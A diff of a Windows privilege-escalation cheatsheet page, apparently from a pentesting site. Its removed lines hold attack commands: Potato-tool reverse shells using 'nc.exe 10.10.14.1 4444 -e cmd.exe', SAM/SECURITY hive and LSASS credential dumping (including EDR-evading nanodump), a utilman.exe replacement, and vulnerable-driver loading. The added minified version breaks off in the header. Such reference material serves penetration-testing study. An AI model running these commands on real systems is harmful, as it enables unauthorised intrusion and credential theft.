@@ -1,487 +1,80 @@
-<!DOCTYPE html>
-<html lang="en-US" dir="ltr" class="">
-<head>
-  <meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>PrivEsc - Tokens &amp; Privileges | JinPwn</title><meta name="description" content="Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum .">
-<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
-
-<link rel="canonical" href="https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/">
-<meta property="og:title" content="PrivEsc - Tokens &amp; Privileges | JinPwn">
-<meta property="og:description" content="Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum .">
-<meta property="og:type" content="website">
-<meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/">
-<meta property="og:site_name" content="JinPwn">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:title" content="PrivEsc - Tokens &amp; Privileges | JinPwn">
-<meta name="twitter:description" content="Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum .">
-<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
-<meta name="twitter:site" content="@jinpwn">
-<meta name="twitter:creator" content="@jinpwn">
-
-
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum .","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"PrivEsc - Tokens \u0026 Privileges | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/"}</script>
-
-<meta name="theme-color" content="#111111">
-<link rel="icon" type="image/png" href="/favicon.png">
-
-      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
-
-
-        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
-        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
-
-
-</head>
-<body class="">
-  
-
-
-
-
-
-  
-  
-  
-
-
-
-  
-
-<header class="site-header">
-  <nav class="top-nav">
-    <div class="container nav-inner">
-      <div class="nav-left">
-        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
-        <div class="nav-links desktop-only">
-          
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-        </div>
-      </div>
-      <div class="nav-actions">
-        <div class="search-anchor" id="search-root" data-search-root>
-          <label class="search-trigger" for="search-input">
-            <span class="search-glyph" aria-hidden="true">
-              <svg viewBox="0 0 24 24">
-                <circle cx="11" cy="11" r="7"></circle>
-                <path d="M20 20L16.65 16.65"></path>
-              </svg>
-            </span>
-            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
-            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
-              <svg viewBox="0 0 24 24" aria-hidden="true">
-                <path d="M18 6L6 18"></path>
-                <path d="M6 6l12 12"></path>
-              </svg>
-            </button>
-            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
-          </label>
-          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
-  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
-  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
-    <p class="search-empty">Type to search posts and cheatsheets.</p>
-  </div>
-</div>
-
-        </div>
-        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
-            <circle cx="11" cy="11" r="7"></circle>
-            <path d="M20 20L16.65 16.65"></path>
-          </svg>
-        </button>
-        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
-            <path d="M3 6h18"></path>
-            <path d="M3 12h18"></path>
-            <path d="M3 18h18"></path>
-          </svg>
-          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
-            <path d="M18 6L6 18"></path>
-            <path d="M6 6l12 12"></path>
-          </svg>
-        </button>
-      </div>
-    </div>
-    <div id="mobile-nav" class="mobile-nav">
-      
-    <a href="/">Posts</a>
-    <a href="/posts/">Archive</a>
-    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
-    <a href="/about/">About</a>
-
-    </div>
-  </nav>
-</header>
-
-  
-  <main class="site-main">
-    
-  
-  
-  
-  <article class="container cheatsheet-docs-shell">
-    <div class="cheatsheet-docs-layout">
-      
-        <aside class="cheatsheet-sidebar" aria-label="Windows Pentesting navigation">
-    <div class="cheatsheet-sidebar-inner">
-      
-        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
-      
-      <a href="/cheatsheets/windows/" class="cheatsheet-sidebar-section">Windows Pentesting</a>
-      
-        <nav class="cheatsheet-sidebar-nav">
-          <ul class="cheatsheet-sidebar-list">
-            
-              <li>
-                <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-sidebar-link">Windows MOC</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-sidebar-link">Recon &amp; Enum</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-sidebar-link">Local Enum</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-sidebar-link is-current">PrivEsc - Tokens &amp; Privileges</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-sidebar-link">PrivEsc - Services &amp; Registry</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-sidebar-link">PrivEsc - DLL &amp; Unquoted Paths</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-sidebar-link">PrivEsc - Credentials &amp; Files</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-sidebar-link">UAC Bypass</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-sidebar-link">PrivEsc - Kernel &amp; Exploits</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-sidebar-link">LOLBAS</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-sidebar-link">Defender &amp; AMSI Evasion</a>
-              </li>
-            
-              <li>
-                <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-sidebar-link">Lateral Movement</a>
-              </li>
-            
-          </ul>
-        </nav>
-      
-    </div>
-  </aside>
-      
-      <div class="cheatsheet-docs-main cheatsheet-page-main">
-        <header class="cheatsheet-page-header">
-          <h1>PrivEsc - Tokens &amp; Privileges</h1>
-          
-        </header>
-
-        
-          <details class="cheatsheet-mobile-sections">
-    <summary class="cheatsheet-mobile-sections-summary">
-      <span class="cheatsheet-mobile-sections-label">Sections</span>
-      <span class="cheatsheet-mobile-sections-current">PrivEsc - Tokens &amp; Privileges</span>
-      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
-    </summary>
-    <div class="cheatsheet-mobile-sections-panel">
-      <nav aria-label="Windows Pentesting sections">
-        <ul class="cheatsheet-mobile-sections-list">
-          
-            <li>
-              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
-            </li>
-          
-          <li>
-            <a href="/cheatsheets/windows/" class="cheatsheet-mobile-sections-link">Overview</a>
-          </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/00-windows-moc/" class="cheatsheet-mobile-sections-link">Windows MOC</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w01-recon--enum/" class="cheatsheet-mobile-sections-link">Recon &amp; Enum</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w02-local-enum/" class="cheatsheet-mobile-sections-link">Local Enum</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w03-privesc---tokens--privileges/" class="cheatsheet-mobile-sections-link is-current">PrivEsc - Tokens &amp; Privileges</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w04-privesc---services--registry/" class="cheatsheet-mobile-sections-link">PrivEsc - Services &amp; Registry</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/" class="cheatsheet-mobile-sections-link">PrivEsc - DLL &amp; Unquoted Paths</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w06-privesc---credentials--files/" class="cheatsheet-mobile-sections-link">PrivEsc - Credentials &amp; Files</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w07-uac-bypass/" class="cheatsheet-mobile-sections-link">UAC Bypass</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w08-privesc---kernel--exploits/" class="cheatsheet-mobile-sections-link">PrivEsc - Kernel &amp; Exploits</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w09-lolbas/" class="cheatsheet-mobile-sections-link">LOLBAS</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w10-defender--amsi-evasion/" class="cheatsheet-mobile-sections-link">Defender &amp; AMSI Evasion</a>
-            </li>
-          
-            <li>
-              <a href="/cheatsheets/windows/w11-lateral-movement/" class="cheatsheet-mobile-sections-link">Lateral Movement</a>
-            </li>
-          
-        </ul>
-      </nav>
-    </div>
-  </details>
-        
-
-        <div class="markdown-content cheatsheet-page-body">
-          <p>Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after <a href="https://jinpwn.dev/cheatsheets/windows/w02-local-enum/">Local Enum</a>
-.</p>
-<h2 id="i-the-privilege-table" data-heading-permalink="true"><span class="heading-content">i. The privilege table</span>
-    <a class="heading-permalink" href="#i-the-privilege-table" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">whoami /priv
-</span></span></code></pre></div><table>
-  <thead>
-      <tr>
-          <th>Privilege</th>
-          <th>What it gives</th>
-          <th>Path</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>SeImpersonatePrivilege</td>
-          <td>Impersonate another token</td>
-          <td>Potato attack</td>
-      </tr>
-      <tr>
-          <td>SeAssignPrimaryTokenPrivilege</td>
-          <td>Assign primary token</td>
-          <td>Potato attack</td>
-      </tr>
-      <tr>
-          <td>SeBackupPrivilege</td>
-          <td>Read any file</td>
-          <td>Dump SAM/SYSTEM</td>
-      </tr>
-      <tr>
-          <td>SeRestorePrivilege</td>
-          <td>Write any file</td>
-          <td>Replace utilman or service binary</td>
-      </tr>
-      <tr>
-          <td>SeDebugPrivilege</td>
-          <td>Open any process</td>
-          <td>Dump LSASS</td>
-      </tr>
-      <tr>
-          <td>SeTakeOwnershipPrivilege</td>
-          <td>Take ownership of any file</td>
-          <td>Own then write</td>
-      </tr>
-      <tr>
-          <td>SeLoadDriverPrivilege</td>
-          <td>Load kernel drivers</td>
-          <td>Capcom driver trick</td>
-      </tr>
-      <tr>
-          <td>SeManageVolumePrivilege</td>
-          <td>Manage volumes</td>
-          <td>Indirect file write</td>
-      </tr>
-      <tr>
-          <td>SeTcbPrivilege</td>
-          <td>Act as part of OS</td>
-          <td>Already SYSTEM-equivalent</td>
-      </tr>
-      <tr>
-          <td>SeCreateTokenPrivilege</td>
-          <td>Create arbitrary tokens</td>
-          <td>Rare, direct SYSTEM</td>
-      </tr>
-  </tbody>
-</table>
-<p>Disabled privileges still count, you just need to enable them first (most tools handle this automatically).</p>
-<h2 id="ii-seimpersonate--seassignprimarytoken-potato-attacks" data-heading-permalink="true"><span class="heading-content">ii. SeImpersonate / SeAssignPrimaryToken (Potato attacks)</span>
-    <a class="heading-permalink" href="#ii-seimpersonate--seassignprimarytoken-potato-attacks" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>The most common path. Service accounts (IIS, MSSQL, etc) have this by default. Pick the potato by the OS:</p>
-<table>
-  <thead>
-      <tr>
-          <th>OS</th>
-          <th>Tool</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>Win Server 2016/2019, Win 10 1809+</td>
-          <td><strong>PrintSpoofer</strong> or <strong>GodPotato</strong></td>
-      </tr>
-      <tr>
-          <td>Win Server 2022, Win 11</td>
-          <td><strong>GodPotato</strong> (PrintSpoofer patched)</td>
-      </tr>
-      <tr>
-          <td>Older Win 7/2008/2012</td>
-          <td><strong>JuicyPotato</strong> (DCOM CLSID method)</td>
-      </tr>
-      <tr>
-          <td>Anywhere modern</td>
-          <td><strong>RoguePotato</strong> (needs OXID resolver redirect)</td>
-      </tr>
-  </tbody>
-</table>
-<p>PrintSpoofer (preferred when it works):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Windows\Temp\PrintSpoofer.exe</span><span class="c1"> -i -c cmd.exe</span>
-</span></span><span class="line"><span class="cl">## Or reverse:
-</span></span><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Windows\Temp\PrintSpoofer.exe</span><span class="c1"> -c &#34;C:\Windows\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe&#34;</span>
-</span></span></code></pre></div><p>GodPotato (works on the newest patched boxes):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Windows\Temp\GodPotato.exe</span><span class="c1"> -cmd &#34;cmd /c whoami&#34;</span>
-</span></span><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Windows\Temp\GodPotato.exe</span><span class="c1"> -cmd &#34;C:\Windows\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe&#34;</span>
-</span></span></code></pre></div><p>JuicyPotato (legacy):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">JuicyPotato.exe -t * -l 1337 -p C:\Windows\Temp\nc.exe -a <span class="s2">&#34;10.10.14.1 4444 -e cmd.exe&#34;</span> -c <span class="s2">&#34;{CLSID}&#34;</span>
-</span></span><span class="line"><span class="cl">## Find a working CLSID from https://ohpe.it/juicy-potato/CLSID/
-</span></span></code></pre></div><p>RoguePotato (when JuicyPotato fails on 2019+):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## On attacker, run a relay on port 135:
-</span></span><span class="line"><span class="cl">socat tcp-listen:135,reuseaddr,fork tcp:10.10.11.50:9999
-</span></span><span class="line"><span class="cl">## On target:
-</span></span><span class="line"><span class="cl">RoguePotato.exe -r 10.10.14.1 -l 9999 -e <span class="s2">&#34;C:\Windows\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe&#34;</span>
-</span></span></code></pre></div><div class="obsidian-callout callout-tip">
-  <div class="obsidian-callout-header">
-    <div class="obsidian-callout-icon" aria-hidden="true">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5 0 0 0 11 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5 2 1.6 3 3.5 3 5.5a7 7 0 1 1-14 0c0-1.153.433-2.294 1-3a2.5 2.5 0 0 0 2.5 2.5z"></path></svg>
-    </div>
-    <span class="obsidian-callout-title">Try in order</span>
-  </div>
-  <div class="obsidian-callout-body">
-    <p>PrintSpoofer first, GodPotato if it fails, RoguePotato as a fallback. JuicyPotato only on legacy boxes (2008-2016). One of them almost always works when SeImpersonate is enabled.</p>
-  </div>
-</div>
-<h2 id="iii-sebackupprivilege" data-heading-permalink="true"><span class="heading-content">iii. SeBackupPrivilege</span>
-    <a class="heading-permalink" href="#iii-sebackupprivilege" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Read any file, even when DACL denies it. Get to SAM and SYSTEM hives, dump them offline:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## Copy SAM + SYSTEM with reg save (needs Backup priv, not admin)</span>
-</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SAM</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">SAM</span>
-</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">SYSTEM</span>
-</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">save</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SECURITY</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">SECURITY</span>
-</span></span><span class="line"><span class="cl"><span class="c">## Download to attacker, then:</span>
-</span></span><span class="line"><span class="cl"><span class="nb">impacket-secretsdump</span> <span class="n">-sam</span> <span class="n">SAM</span> <span class="n">-system</span> <span class="n">SYSTEM</span> <span class="n">-security</span> <span class="n">SECURITY</span> <span class="n">LOCAL</span>
-</span></span></code></pre></div><p>When <code>reg save</code> is blocked, use <code>robocopy</code> with backup mode:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">robocopy /B C:\Windows\System32\config\ C:\Windows\Temp\ SAM SYSTEM SECURITY
-</span></span></code></pre></div><p>Then pass the hash to Administrator, see <a href="https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/">Lateral Movement</a>
-.</p>
-<h2 id="iv-serestoreprivilege" data-heading-permalink="true"><span class="heading-content">iv. SeRestorePrivilege</span>
-    <a class="heading-permalink" href="#iv-serestoreprivilege" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Write any file. Two classic abuse paths:</p>
-<p>Replace <code>utilman.exe</code> (the accessibility tool on the lock screen) with cmd, then trigger from lockscreen Win+U:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">takeown /f C:\Windows\System32\utilman.exe
-</span></span><span class="line"><span class="cl"><span class="k">copy</span> C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
-</span></span><span class="line"><span class="cl">## Lock the screen, press Win+U -<span class="p">&gt;</span> SYSTEM cmd
-</span></span></code></pre></div><p>Or overwrite a service binary you can&rsquo;t normally write to, then restart the service (need restart rights, common with SeServiceLogon or admin on a service).</p>
-<h2 id="v-sedebugprivilege" data-heading-permalink="true"><span class="heading-content">v. SeDebugPrivilege</span>
-    <a class="heading-permalink" href="#v-sedebugprivilege" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Open any process, including LSASS. Pull all logged-in user creds:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## Native procdump (signed Microsoft binary, often allowed)</span>
-</span></span><span class="line"><span class="cl"><span class="n">procdump</span><span class="p">.</span><span class="py">exe</span> <span class="n">-accepteula</span> <span class="n">-ma</span> <span class="n">lsass</span><span class="p">.</span><span class="py">exe</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="py">dmp</span>
-</span></span><span class="line"><span class="cl"><span class="c">## Then on attacker:</span>
-</span></span><span class="line"><span class="cl"><span class="nb">impacket-pypykatz</span> <span class="n">lsa</span> <span class="n">minidump</span> <span class="n">lsass</span><span class="p">.</span><span class="py">dmp</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">## Native task manager dump if procdump isn&#39;t there</span>
-</span></span><span class="line"><span class="cl"><span class="c">## (Task Manager -&gt; Details -&gt; right click lsass -&gt; Create dump file)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c">## Nanodump (designed to evade EDR)</span>
-</span></span><span class="line"><span class="cl"><span class="n">nanodump</span><span class="p">.</span><span class="py">exe</span> <span class="p">-</span><span class="n">-write</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">lsass</span><span class="p">.</span><span class="py">dmp</span>
-</span></span></code></pre></div><p>Or attach with a debugger and run shellcode:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## Open a SYSTEM process and inject</span>
-</span></span><span class="line"><span class="cl"><span class="c">## Frameworks: pyrasite (Python), PowerSploit Invoke-DllInjection</span>
-</span></span></code></pre></div><h2 id="vi-setakeownershipprivilege" data-heading-permalink="true"><span class="heading-content">vi. SeTakeOwnershipPrivilege</span>
-    <a class="heading-permalink" href="#vi-setakeownershipprivilege" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Take ownership of any object, then change DACL to allow yourself write access:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">takeown /f C:\Windows\System32\config\SAM
-</span></span><span class="line"><span class="cl">icacls C:\Windows\System32\config\SAM /grant <span class="nv">%USERNAME%</span>:F
-</span></span><span class="line"><span class="cl"><span class="k">copy</span> C:\Windows\System32\config\SAM C:\Windows\Temp\SAM
-</span></span></code></pre></div><p>Combine with SeRestore to skip the icacls step (you have write right via the privilege).</p>
-<h2 id="vii-seloaddriverprivilege" data-heading-permalink="true"><span class="heading-content">vii. SeLoadDriverPrivilege</span>
-    <a class="heading-permalink" href="#vii-seloaddriverprivilege" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Load a kernel driver. Use a known vulnerable signed driver to gain kernel exec:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## Capcom.sys is the classic (signed by Capcom, vulnerable, lets you exec ring0 code)</span>
-</span></span><span class="line"><span class="cl"><span class="c">## Public PoC: https://github.com/TarlogicSecurity/EoPLoadDriver</span>
-</span></span><span class="line"><span class="cl"><span class="n">EoPLoadDriver</span><span class="p">.</span><span class="py">exe</span> <span class="n">System</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">MyService</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">capcom</span><span class="p">.</span><span class="py">sys</span>
-</span></span><span class="line"><span class="cl"><span class="c">## Then exploit via ExploitCapcom.exe to spawn SYSTEM</span>
-</span></span></code></pre></div><p>Most modern Win blocks unsigned drivers and revokes Capcom&rsquo;s signature. Try only on older boxes.</p>
-<h2 id="viii-semanagevolumeprivilege" data-heading-permalink="true"><span class="heading-content">viii. SeManageVolumePrivilege</span>
-    <a class="heading-permalink" href="#viii-semanagevolumeprivilege" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Modest privilege that leads to file access. Use SeManageVolumeExploit:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">SeManageVolumeExploit.exe
-</span></span><span class="line"><span class="cl">## Grants you NTFS rights to C:\, then you can read/write anything
-</span></span></code></pre></div><h2 id="ix-secreatetoken--setcb" data-heading-permalink="true"><span class="heading-content">ix. SeCreateToken + SeTcb</span>
-    <a class="heading-permalink" href="#ix-secreatetoken--setcb" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>If you have these, you are effectively SYSTEM already. Create your own token with any SIDs:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">## Rare, but if you have SeCreateToken, NoPac-style abuse
-</span></span><span class="line"><span class="cl">## Direct token creation -<span class="p">&gt;</span> impersonate -<span class="p">&gt;</span> SYSTEM
-</span></span></code></pre></div><h2 id="x-quick-whoami-priv---action-table" data-heading-permalink="true"><span class="heading-content">x. Quick whoami /priv -&gt; action table</span>
-    <a class="heading-permalink" href="#x-quick-whoami-priv---action-table" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>When you see this, do this:</p>
-<pre tabindex="0"><code>SeImpersonatePrivilege            Enabled   -&gt; PrintSpoofer / GodPotato
+<!doctype html><html lang=en-US dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>PrivEsc - Tokens & Privileges | JinPwn</title><meta name=description content="Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum ."><meta name=robots content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><meta name=googlebot content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1"><link rel=canonical href=https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/><meta property="og:title" content="PrivEsc - Tokens & Privileges | JinPwn"><meta property="og:description" content="Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum ."><meta property="og:type" content="website"><meta property="og:url" content="https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/"><meta property="og:site_name" content="JinPwn"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="PrivEsc - Tokens & Privileges | JinPwn"><meta name=twitter:description content="Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum ."><meta name=twitter:image content="https://jinpwn.dev/images/og/og.png"><meta name=twitter:site content="@jinpwn"><meta name=twitter:creator content="@jinpwn"><script type=application/ld+json>{"@context":"https://schema.org","@type":"WebPage","description":"Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after Local Enum .","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"PrivEsc - Tokens \u0026 Privileges | JinPwn","url":"https://jinpwn.dev/cheatsheets/windows/w03-privesc---tokens--privileges/"}</script><meta name=theme-color content="#111111"><link rel=icon type=image/png href=/favicon.png><link rel=stylesheet href=/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin=anonymous><script src=/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin=anonymous defer></script><script src=/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin=anonymous defer></script></head><body><header class=site-header><nav class=top-nav><div class="container nav-inner"><div class=nav-left><a href=/ class="brand-link has-logo" aria-label=Home><img src=/favicon.png alt=jinpwn.dev class=brand-logo style=--brand-logo-height:36px></a><div class="nav-links desktop-only"><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></div><div class=nav-actions><div class=search-anchor id=search-root data-search-root><label class=search-trigger for=search-input><span class=search-glyph aria-hidden=true><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</span><input id=search-input type=search placeholder=Search... autocomplete=off spellcheck=false aria-label="Search posts and cheatsheets">
+<button type=button class=search-clear data-search-clear aria-label="Clear search" hidden>
